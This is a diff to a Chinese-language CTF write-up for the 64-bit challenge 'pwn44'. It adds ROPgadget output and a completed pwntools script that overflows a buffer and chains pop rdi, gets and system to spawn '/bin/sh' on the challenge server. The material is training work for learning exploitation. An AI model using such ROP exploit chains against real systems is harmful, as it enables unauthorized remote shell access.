@@ -66,6 +66,27 @@ int system(const char *command)
 .bss:0000000000602082 ??                            db    ? ;
 ```
 
+查看`pop|ret`
+
+```
+tasike@tasike-VM:~/Desktop$ ROPgadget --binary pwn44 --only "pop|ret"
+Gadgets information
+============================================================
+0x00000000004007ec : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
+0x00000000004007ee : pop r13 ; pop r14 ; pop r15 ; ret
+0x00000000004007f0 : pop r14 ; pop r15 ; ret
+0x00000000004007f2 : pop r15 ; ret
+0x00000000004007eb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
+0x00000000004007ef : pop rbp ; pop r14 ; pop r15 ; ret
+0x00000000004005b8 : pop rbp ; ret
+0x00000000004007f3 : pop rdi ; ret
+0x00000000004007f1 : pop rsi ; pop r15 ; ret
+0x00000000004007ed : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
+0x00000000004004fe : ret
+
+Unique gadgets found: 11
+```
+
 和上一题思路一样，只不过这题是64位的
 
 
@@ -75,7 +96,14 @@ int system(const char *command)
 ```python
 from pwn import *
 context(os = 'Linux', arch = 'amd64', log_level = 'debug')
-r = remote('pwn.challenge.ctf.show', 28130)
-payload = cyclic(0xA + 0x8) + p64()
+r = remote('pwn.challenge.ctf.show', 28284)
+poprdi = 0x4007f3
+buf2 = 0x602080
+gets = 0x400530
+system = 0x400520
+payload = cyclic(0xA + 0x8) + p64(poprdi) + p64(buf2) + p64(gets) + p64(poprdi) + p64(buf2) + p64(system)
+r.sendline(payload)
+r.sendline("/bin/sh")
+r.interactive()
 ```
 
